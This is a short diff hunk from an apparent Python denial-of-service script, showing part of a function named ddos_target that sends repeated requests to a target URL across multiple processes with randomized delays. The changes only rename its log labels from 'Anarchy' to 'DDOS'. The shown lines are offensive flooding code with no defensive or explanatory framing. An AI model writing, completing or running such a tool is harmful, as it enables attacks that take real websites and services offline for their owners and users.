@@ -25,9 +25,9 @@ def ddos_target(url, num_threads):
                 if response.status_code == 200:
                     print("[Anarchy]: Request sent successfully")
                 else:
-                    print("[Anarchy]: Connection failed. Status code:", response.status_code)
+                    print("[DDOS]: Connection failed. Status code:", response.status_code)
             except requests.exceptions.RequestException:
-                print("[Anarchy]: Connection timed out")
+                print("[DDOS]: Connection timed out")
             time.sleep(random.uniform(0.1, 1))  # Add a random delay between each request
 
     processes = []
